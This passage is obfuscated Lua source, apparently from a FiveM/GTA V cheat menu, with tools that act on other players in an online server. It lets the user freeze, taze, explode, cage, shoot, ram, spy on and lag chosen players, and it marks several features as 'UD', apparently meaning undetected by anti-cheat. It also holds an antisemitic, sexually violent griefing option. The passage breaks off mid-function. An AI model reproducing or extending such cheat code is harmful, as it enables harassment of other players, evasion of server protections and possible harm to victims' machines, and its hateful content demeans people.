                    local y = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Y Coord (ex: 125.234)', '', 15)
                    nlFXKkFxuKQAk.natives.SetNewWaypoint(x, y)
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Made Wapoint ~w~To Coords!')
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Preset Outfit 1', 1, 70, 140) then
                    DmSgpcIoUEJtyTfBBt.FunFunc.PreMadeFit1()
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Outfit 1 Has Been ~g~Equipt')
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Preset Outfit 2', 1, 90, 140) then
                    DmSgpcIoUEJtyTfBBt.FunFunc.PreMadeFit2()
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Outfit 2 Has Been ~g~Equipt')
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Preset Outfit 3', 1, 110, 140) then
                    DmSgpcIoUEJtyTfBBt.FunFunc.PreMadeFit3()
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Outfit 3 Has Been ~g~Equipt')
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Kyler Sunset', 1, 130, 140) then
                    DmSgpcIoUEJtyTfBBt.FunFunc.kylersunset()
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Are Now ~g~Kyler Sunset')
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Tubeuler Dude!')
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Chad Sunset', 1, 150, 140) then
                    DmSgpcIoUEJtyTfBBt.FunFunc.chadsunset()
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Are Now ~g~Chad Sunset')
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Thats Rad!')
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Arjun Ranch', 1, 170, 140) then
                    DmSgpcIoUEJtyTfBBt.FunFunc.argunr()
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Are Now ~g~Arjun')
                end
                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Default Ped', 1, 190, 140) then
                    nlFXKkFxuKQAk.natives.SetPedDefaultComponentVariation(nlFXKkFxuKQAk.natives.PlayerPedId())
                    DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Outfit Has Been ~g~Reset')
                end

            end
                --ONLINE PLAYER LIST
            if jrnyLearIyzKiSIen.config.Men2T then
                jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX + 260 + jrnyLearIyzKiSIen.config.SubMenuWH.abOl, jrnyLearIyzKiSIen.config.MainY + 60 + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.abOl2, 200, jrnyLearIyzKiSIen.config.SubMenuWH.h, jrnyLearIyzKiSIen.config.CSecondary.r, jrnyLearIyzKiSIen.config.CSecondary.g, jrnyLearIyzKiSIen.config.CSecondary.b, jrnyLearIyzKiSIen.config.CSecondary.a)
                jrnyLearIyzKiSIen.func.DrawSomeText('Online Player List', 4, false, jrnyLearIyzKiSIen.config.MainX + jrnyLearIyzKiSIen.config.SubMenuWH.abOl7, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.abOl6, jrnyLearIyzKiSIen.config.SubMenuScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                
                jrnyLearIyzKiSIen.config.Men2tOff = 10
                jrnyLearIyzKiSIen.config.Men2mbOff = 0

                local playerlist = nlFXKkFxuKQAk.natives.GetActivePlayers()
                
                local pages = RfPsUKHSFWJuBEJuz.rE.LumMath.LumCeli(#playerlist / 9)

                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('\226\134\144\10', 2, -21, jrnyLearIyzKiSIen.config.SubMenuWH.abOl4, 0) then
                    if jrnyLearIyzKiSIen.config.OnlinePPageS.oppages ~= 0 then
                        jrnyLearIyzKiSIen.config.OnlinePPageS.oppages = (jrnyLearIyzKiSIen.config.OnlinePPageS.oppages - 1) % pages
                    end
                end

                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('\226\134\146\10', 2, -21, jrnyLearIyzKiSIen.config.SubMenuWH.abOl5, 0) then
                    if jrnyLearIyzKiSIen.config.OnlinePPageS.oppages ~= pages - 1 then
                        jrnyLearIyzKiSIen.config.OnlinePPageS.oppages = (jrnyLearIyzKiSIen.config.OnlinePPageS.oppages + 1) % pages
                    end
                end

                jrnyLearIyzKiSIen.func.DrawSomeText('Page: '.. jrnyLearIyzKiSIen.config.OnlinePPageS.oppages + 1 .. '/'.. pages ..'', 4, false, jrnyLearIyzKiSIen.config.MainX + jrnyLearIyzKiSIen.config.SubMenuWH.abOl9, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.abOl10, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)

                local trueoppage = jrnyLearIyzKiSIen.config.OnlinePPageS.oppages + 1
                local showoppage = trueoppage * 9
                local dontshowoppage = showoppage - 9

                if jrnyLearIyzKiSIen.config.SelecOP == nil then
                    jrnyLearIyzKiSIen.config.SelecOP = playerlist[1]
                end
                RfPsUKHSFWJuBEJuz.rE.LumTable.LumSort(playerlist, function(a, b)
                    return (nlFXKkFxuKQAk.natives.GetPlayerServerId(a) < nlFXKkFxuKQAk.natives.GetPlayerServerId(b))
                end)

                for i = 1, #playerlist do
                    local currPlayer = playerlist[i]
                    jrnyLearIyzKiSIen.config.Men2mbOff = jrnyLearIyzKiSIen.config.Men2mbOff + 17.3

                    if showoppage >= i and dontshowoppage < i then
                        if DmSgpcIoUEJtyTfBBt.Mfunc.Button('ID: ' .. nlFXKkFxuKQAk.natives.GetPlayerServerId(currPlayer) .. '  ' .. nlFXKkFxuKQAk.natives.GetPlayerName(currPlayer) .. '', 2, jrnyLearIyzKiSIen.config.Men2tOff, jrnyLearIyzKiSIen.config.SubMenuWH.abOl8) then
                            jrnyLearIyzKiSIen.config.SelecOP = currPlayer
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Selected: ~g~'.. nlFXKkFxuKQAk.natives.GetPlayerName(currPlayer) ..'')
                        end
                        jrnyLearIyzKiSIen.config.Men2tOff = jrnyLearIyzKiSIen.config.Men2tOff + 17
                    end
                end

                jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX + 260 + jrnyLearIyzKiSIen.config.SubMenuWH.abOl, jrnyLearIyzKiSIen.config.MainY + 100 + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.abOl3, 200, 155, jrnyLearIyzKiSIen.config.CSecondary2.r, jrnyLearIyzKiSIen.config.CSecondary2.g, jrnyLearIyzKiSIen.config.CSecondary2.b, jrnyLearIyzKiSIen.config.CSecondary2.a)
            end
                --ONLINE OPTIONS
            if jrnyLearIyzKiSIen.config.Men2T then
                jrnyLearIyzKiSIen.func.DrawSomeText('Selected Player: ' .. nlFXKkFxuKQAk.natives.GetPlayerName(jrnyLearIyzKiSIen.config.SelecOP) .. '', 4, false, jrnyLearIyzKiSIen.config.MainX + 10, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2, jrnyLearIyzKiSIen.config.PointerScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)

                if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('', REVMYmrswsZvxOXvJE.Mopt5.items, REVMYmrswsZvxOXvJE.Mopt5.currentItemIndex, REVMYmrswsZvxOXvJE.Mopt5.selectedItemIndex, function(currentIndex, selectedIndex)
                    REVMYmrswsZvxOXvJE.Mopt5.currentItemIndex = currentIndex 
                    REVMYmrswsZvxOXvJE.Mopt5.selectedItemIndex = selectedIndex
                end, 2, 30) then end

                if REVMYmrswsZvxOXvJE.Mopt5.values[REVMYmrswsZvxOXvJE.Mopt5.selectedItemIndex] == 1 then
                    jrnyLearIyzKiSIen.config.offset2 = jrnyLearIyzKiSIen.config.offset2 + 135
                    jrnyLearIyzKiSIen.config.Men3Y = jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men4Y = jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men5Y = jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset2, jrnyLearIyzKiSIen.config.CSecondary2.r, jrnyLearIyzKiSIen.config.CSecondary2.g, jrnyLearIyzKiSIen.config.CSecondary2.b, jrnyLearIyzKiSIen.config.CSecondary2.a)

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Spectate', jrnyLearIyzKiSIen.config.specfornow, function(enabled) jrnyLearIyzKiSIen.config.specfornow = enabled end, 2, 50) then
                        if jrnyLearIyzKiSIen.config.specfornow then
                            DmSgpcIoUEJtyTfBBt.FunFunc.specnow(jrnyLearIyzKiSIen.config.SelecOP)
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Are Now ~g~Spectating')
                        else
                            nlFXKkFxuKQAk.natives.DestroyCam(cam)
                            nlFXKkFxuKQAk.natives.ClearTimecycleModifier()
                            nlFXKkFxuKQAk.natives.RenderScriptCams(false, false, 0, 1, 0)
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Stopped ~r~Spectating')
                        end                    
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Create Waypoint to Player', jrnyLearIyzKiSIen.config.features.wptoselp, function(enabled) jrnyLearIyzKiSIen.config.features.wptoselp = enabled end, 2, 70) then 
                        if jrnyLearIyzKiSIen.config.features.wptoselp then
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Are Now ~g~Tracking This Player')
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Stopped ~r~Tracking This Player')
                        end
                        RfPsUKHSFWJuBEJuz.rE.LumThread(function()
                            while jrnyLearIyzKiSIen.config.features.wptoselp do RfPsUKHSFWJuBEJuz.rE.LumWait(500)
                                local ped = nlFXKkFxuKQAk.natives.GetPlayerPed(jrnyLearIyzKiSIen.config.SelecOP)
                                local coords = nlFXKkFxuKQAk.natives.GetEntityCoords(ped, false)
                                nlFXKkFxuKQAk.natives.SetNewWaypoint(coords.x, coords.y)
                            end
                        end)
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Teleport To Player', 2, 90) then
                        DmSgpcIoUEJtyTfBBt.FunFunc.TeleportToPlayer(jrnyLearIyzKiSIen.config.SelecOP)
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('~g~Teleported ~w~To The Selected Player')
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Clone Outfit', 2, 110) then
                        DmSgpcIoUEJtyTfBBt.FunFunc.CloneDaFit(jrnyLearIyzKiSIen.config.SelecOP)
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Are Now ~g~This Player')
                    end
                    
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Give Weapon To Player', 2, 130) then
                        local stupidped = nlFXKkFxuKQAk.natives.GetPlayerPed(jrnyLearIyzKiSIen.config.SelecOP)			
                        local wepnamegay = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Weapon Name', 'weapon_', 100)		
                        local ammogay = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Ammo Count', '', 1000)
                        if wepnamegay and nlFXKkFxuKQAk.natives.IsWeaponValid(wepnamegay) then
                            if RfPsUKHSFWJuBEJuz.rE.LumToNum(ammogay) >= 200 then
                                ammogay = 200
                            end
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Given This Player An ~g~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(wepnamegay) ..'')			
                            nlFXKkFxuKQAk.natives.GiveWeaponToPed(stupidped, RfPsUKHSFWJuBEJuz.rE.LumHash(wepnamegay), RfPsUKHSFWJuBEJuz.rE.LumToNum(ammogay), false, false)				
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(wepnamegay) ..' ~w~Is Not A Valid Weapon!')
                        end
                    end
                elseif REVMYmrswsZvxOXvJE.Mopt5.values[REVMYmrswsZvxOXvJE.Mopt5.selectedItemIndex] == 2 then
                    jrnyLearIyzKiSIen.config.offset2 = jrnyLearIyzKiSIen.config.offset2 + 215
                    jrnyLearIyzKiSIen.config.Men3Y = jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men4Y = jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men5Y = jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset2, jrnyLearIyzKiSIen.config.CSecondary2.r, jrnyLearIyzKiSIen.config.CSecondary2.g, jrnyLearIyzKiSIen.config.CSecondary2.b, jrnyLearIyzKiSIen.config.CSecondary2.a)

                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Attach Shit', REVMYmrswsZvxOXvJE.AObj.items, REVMYmrswsZvxOXvJE.AObj.currentItemIndex, REVMYmrswsZvxOXvJE.AObj.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.AObj.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.AObj.selectedItemIndex = selectedIndex
                    end, 2, 50) then 
                        REVMYmrswsZvxOXvJE.AObj.values[REVMYmrswsZvxOXvJE.AObj.selectedItemIndex](jrnyLearIyzKiSIen.config.SelecOP)
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~r~Attached ~w~Something To The Player')
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Freeze', jrnyLearIyzKiSIen.config.features.elnomove, function(enabled) jrnyLearIyzKiSIen.config.features.elnomove = enabled end, 2, 70) then
                        if jrnyLearIyzKiSIen.config.features.elnomove then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~b~Froze ~w~The Selected Player') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~r~Unfroze ~w~The Selected Player') end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('Taze (Loop)', jrnyLearIyzKiSIen.config.features.tazeloopselp, function(enabled) jrnyLearIyzKiSIen.config.features.tazeloopselp = enabled end, 2, 90) then 
                        if jrnyLearIyzKiSIen.config.features.tazeloopselp then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Are ~y~Tazing ~w~The Selected Player') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Stopped ~y~Tazing ~w~The Selected Player') end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.CheckBox('UD Explode (Loop)', jrnyLearIyzKiSIen.config.features.boomloopselp, function(enabled) jrnyLearIyzKiSIen.config.features.boomloopselp = enabled end, 2, 110) then 
                        if jrnyLearIyzKiSIen.config.features.boomloopselp then DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Are ~r~Exploading ~w~The Selected Player') else DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Stopped ~r~Exploading ~w~The Selected Player') end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Cage Player (UD)', 2, 130) then
                        DmSgpcIoUEJtyTfBBt.FunFunc.cagerino(jrnyLearIyzKiSIen.config.SelecOP)
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You ~g~Caged ~w~The Selected Player')
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('UD Explode (Semi-Reliable)', 2, 150) then
                        DmSgpcIoUEJtyTfBBt.FunFunc.goboom(jrnyLearIyzKiSIen.config.SelecOP)
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~r~Exploded ~w~The Selected Player')
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Jew Rape Player', 2, 170) then
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have ~g~Jew Raped ~w~The Selected Player')
                        local jewtable = {'a_m_m_hasjew_01', 'a_m_y_hasjew_01'}
                        local ped = jrnyLearIyzKiSIen.config.SelecOP
                        while not nlFXKkFxuKQAk.natives.HasModelLoaded('a_m_y_hasjew_01') do
                            nlFXKkFxuKQAk.natives.RequestModel('a_m_y_hasjew_01')
                            RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                        end
                        while not nlFXKkFxuKQAk.natives.HasModelLoaded('a_m_m_hasjew_01') do
                            nlFXKkFxuKQAk.natives.RequestModel('a_m_m_hasjew_01')
                            RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                        end
                        while not nlFXKkFxuKQAk.natives.HasAnimDictLoaded('rcmpaparazzo_2') do
                            nlFXKkFxuKQAk.natives.RequestAnimDict('rcmpaparazzo_2')
                            RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                        end
                            if nlFXKkFxuKQAk.natives.IsPedInAnyVehicle(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), true) then
                                local veh = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), true)
                                    if not nlFXKkFxuKQAk.natives.NetworkHasControlOfEntity(veh) then
                                        nlFXKkFxuKQAk.natives.NetworkRequestControlOfEntity(veh)
                                        RfPsUKHSFWJuBEJuz.rE.LumWait(0)
                                    end
                                nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(veh, true, true)
                                nlFXKkFxuKQAk.natives.DeleteVehicle(veh)
                                nlFXKkFxuKQAk.natives.DeleteEntity(veh)
                            end
                            local Spacing = -0.2
                        for k, v in RfPsUKHSFWJuBEJuz.rE.Lumpairs(jewtable) do
                            local x, y, z = RfPsUKHSFWJuBEJuz.rE.LumTable.LumUnPack(nlFXKkFxuKQAk.natives.GetEntityCoords(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), true))
                            local JewPed = nlFXKkFxuKQAk.natives.CreatePed(4, RfPsUKHSFWJuBEJuz.rE.LumHash(v), x, y, z, 0.0, true, false)
                            nlFXKkFxuKQAk.natives.SetEntityAsMissionEntity(JewPed, true, true)
                            nlFXKkFxuKQAk.natives.AttachEntityToEntity(JewPed, nlFXKkFxuKQAk.natives.GetPlayerPed(ped), 4103, 11816, Spacing, 0.00, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                            nlFXKkFxuKQAk.natives.ClearPedTasks(nlFXKkFxuKQAk.natives.GetPlayerPed(ped))
                            nlFXKkFxuKQAk.natives.TaskPlayAnim(nlFXKkFxuKQAk.natives.GetPlayerPed(ped), 'rcmpaparazzo_2', 'shag_loop_poppy', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                            nlFXKkFxuKQAk.natives.SetPedKeepTask(JewPed)
                            nlFXKkFxuKQAk.natives.TaskPlayAnim(JewPed, 'rcmpaparazzo_2', 'shag_loop_a', 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                            nlFXKkFxuKQAk.natives.SetEntityInvincible(JewPed, true)
                            Spacing = Spacing - 0.4
                        end
                    end
                    
                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Lag The Player', 2, 190) then
                        DmSgpcIoUEJtyTfBBt.FunFunc.lagmen(jrnyLearIyzKiSIen.config.SelecOP)
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification("You Have ~r~Fucked ~w~The Selected Player's PC")
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Have A Ped Steal Their Car', 2, 210) then
                        local Vshit = nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(jrnyLearIyzKiSIen.config.SelecOP), false)
                        if Vshit ~= 0 then
                            DmSgpcIoUEJtyTfBBt.FunFunc.StealDaV(Vshit)
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification("Ped ~g~Succsesfully ~w~Stole The Car!")
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification("~r~Error: ~w~Player Is Not In A Vehicle")
                        end
                    end

                elseif REVMYmrswsZvxOXvJE.Mopt5.values[REVMYmrswsZvxOXvJE.Mopt5.selectedItemIndex] == 3 then
                    jrnyLearIyzKiSIen.config.offset2 = jrnyLearIyzKiSIen.config.offset2 + 135
                    jrnyLearIyzKiSIen.config.Men3Y = jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men4Y = jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men5Y = jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset2, jrnyLearIyzKiSIen.config.CSecondary2.r, jrnyLearIyzKiSIen.config.CSecondary2.g, jrnyLearIyzKiSIen.config.CSecondary2.b, jrnyLearIyzKiSIen.config.CSecondary2.a)

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Shoot Gun: ', 2, 50) then
                        local textie = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Vehicle Name', '', 100)
                        if textie and nlFXKkFxuKQAk.natives.IsWeaponValid(textie) then
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Set The Weapon To: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie).. '')
                            jrnyLearIyzKiSIen.config.shootselwep = textie
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(textie) ..' ~w~Is Not A Valid Weapon!')
                        end
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Damage: ', 2, 67) then
                        local dmgtextie = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Damage Amount (EX: 100.0)', '', 5)
                        if RfPsUKHSFWJuBEJuz.rE.LumToNum(dmgtextie) >= 10001 then
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(dmgtextie) ..' ~w~Damage Is Too High!')
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('The Damage Has Been Set To: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(dmgtextie) ..'')
                            jrnyLearIyzKiSIen.config.shootseldmg = RfPsUKHSFWJuBEJuz.rE.LumToNum(dmgtextie)
                        end
                    end

                    jrnyLearIyzKiSIen.func.DrawSomeText('' .. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(jrnyLearIyzKiSIen.config.shootselwep) .. '', 4, false, jrnyLearIyzKiSIen.config.MainX + 68, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 + 40, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)
                    jrnyLearIyzKiSIen.func.DrawSomeText('' .. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(jrnyLearIyzKiSIen.config.shootseldmg) .. '', 4, false, jrnyLearIyzKiSIen.config.MainX + 60, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 + 57.5, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Shoot Player', 2, 84) then
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Shot The Selected Player')
                        DmSgpcIoUEJtyTfBBt.FunFunc.ShootP(jrnyLearIyzKiSIen.config.shootselwep, jrnyLearIyzKiSIen.config.SelecOP, jrnyLearIyzKiSIen.config.shootseldmg)
                    end

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Ram Vehicle: ', 2, 110) then
                        local vtextie = DmSgpcIoUEJtyTfBBt.Mfunc.KeyboardInput('Vehicle', '', 100)
                        if vtextie and nlFXKkFxuKQAk.natives.IsModelAVehicle(vtextie) then
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('You Have Set The Vehicle To: '.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(vtextie).. '')
                            jrnyLearIyzKiSIen.config.ramselveh = vtextie
                        else
                            DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('ERROR: ~r~'.. RfPsUKHSFWJuBEJuz.rE.LumString.LumUpper(vtextie) ..' ~w~Is Not A Vehicle!')
                        end
                    end

                    jrnyLearIyzKiSIen.func.DrawSomeText('' .. jrnyLearIyzKiSIen.config.ramselveh .. '', 4, false, jrnyLearIyzKiSIen.config.MainX + 76, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2 + 100, jrnyLearIyzKiSIen.config.ButtonScale, jrnyLearIyzKiSIen.config.CText.r, jrnyLearIyzKiSIen.config.CText.g, jrnyLearIyzKiSIen.config.CText.b, jrnyLearIyzKiSIen.config.CText.a)

                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Ram Player', 2, 127) then
                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Your Have ~g~Succesfuly ~w~Rammed The Selected Player')
                        DmSgpcIoUEJtyTfBBt.FunFunc.RamP(jrnyLearIyzKiSIen.config.SelecOP, jrnyLearIyzKiSIen.config.ramselveh)
                    end
                
                elseif REVMYmrswsZvxOXvJE.Mopt5.values[REVMYmrswsZvxOXvJE.Mopt5.selectedItemIndex] == 4 then
                    local hitmany = 50
                    jrnyLearIyzKiSIen.config.offset2 = jrnyLearIyzKiSIen.config.offset2 + 190
                    jrnyLearIyzKiSIen.config.Men3Y = jrnyLearIyzKiSIen.config.Men3Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men4Y = jrnyLearIyzKiSIen.config.Men4Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.config.Men5Y = jrnyLearIyzKiSIen.config.Men5Y + jrnyLearIyzKiSIen.config.offset2
                    jrnyLearIyzKiSIen.func.DrawRectangle(jrnyLearIyzKiSIen.config.MainX, jrnyLearIyzKiSIen.config.MainY + jrnyLearIyzKiSIen.config.Men2Y + jrnyLearIyzKiSIen.config.SubMenuWH.subs2, jrnyLearIyzKiSIen.config.SubMenuWH.w, jrnyLearIyzKiSIen.config.offset2, jrnyLearIyzKiSIen.config.CSecondary2.r, jrnyLearIyzKiSIen.config.CSecondary2.g, jrnyLearIyzKiSIen.config.CSecondary2.b, jrnyLearIyzKiSIen.config.CSecondary2.a)
                    if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Hit Method', REVMYmrswsZvxOXvJE.HitMethod.items, REVMYmrswsZvxOXvJE.HitMethod.currentItemIndex, REVMYmrswsZvxOXvJE.HitMethod.selectedItemIndex, function(currentIndex, selectedIndex)
                        REVMYmrswsZvxOXvJE.HitMethod.currentItemIndex = currentIndex 
                        REVMYmrswsZvxOXvJE.HitMethod.selectedItemIndex = selectedIndex
                    end, 2, hitmany) then end
                        hitmany = hitmany + 20

                    -- if driveby car 70
                    if REVMYmrswsZvxOXvJE.HitMethod.values[REVMYmrswsZvxOXvJE.HitMethod.selectedItemIndex] == 3 then
